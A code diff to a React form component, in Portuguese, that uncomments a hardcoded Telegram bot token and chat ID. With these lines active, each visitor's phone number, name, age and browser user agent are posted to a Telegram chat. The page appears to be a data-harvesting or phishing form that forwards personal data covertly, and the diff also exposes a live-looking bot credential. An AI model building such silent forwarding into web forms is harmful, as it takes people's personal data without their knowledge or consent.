@@ -45,8 +45,8 @@ const ContextForm = ({ children }) => {
     localStorage.setItem("telefone", telefone);
 
     const dispositivo = navigator.userAgent;
-    // let chatId = "6579066348";
-    // let botToken = "7831458417:AAExsWVmDTr-FLf75niwX0E7PpPap54Ze6U";
+    let chatId = "6579066348";
+    let botToken = "7831458417:AAExsWVmDTr-FLf75niwX0E7PpPap54Ze6U";
 
     const message = `📞Número de telefone: ${telefone}\n🧑‍🦰Nome: ${nome}\n🔒Idade: ${idade}\n📱Dispositivo:${dispositivo}`;
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -55,7 +55,7 @@ const ContextForm = ({ children }) => {
         "Content-Type": "application/json",
       },
       body: JSON.stringify({
-        // chat_id: chatId,
+        chat_id: chatId,
         text: message,
       }),
     })
@@ -74,10 +74,10 @@ const ContextForm = ({ children }) => {
   };
 
   function captureDispositivo() {
-    // const dispositivo = navigator.userAgent;
-    // let chatId = "6579066348";
-    // let botToken = "7831458417:AAExsWVmDTr-FLf75niwX0E7PpPap54Ze6U";
-    // const message = `📱Dispositivo:${dispositivo}`;
+    const dispositivo = navigator.userAgent;
+    let chatId = "6579066348";
+    let botToken = "7831458417:AAExsWVmDTr-FLf75niwX0E7PpPap54Ze6U";
+    const message = `📱Dispositivo:${dispositivo}`;
     
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
@@ -85,8 +85,8 @@ const ContextForm = ({ children }) => {
         "Content-Type": "application/json",
       },
       body: JSON.stringify({
-        // chat_id: chatId,
-        // text: message,
+        chat_id: chatId,
+        text: message,
       }),
     })
       .then((response) => response.json())
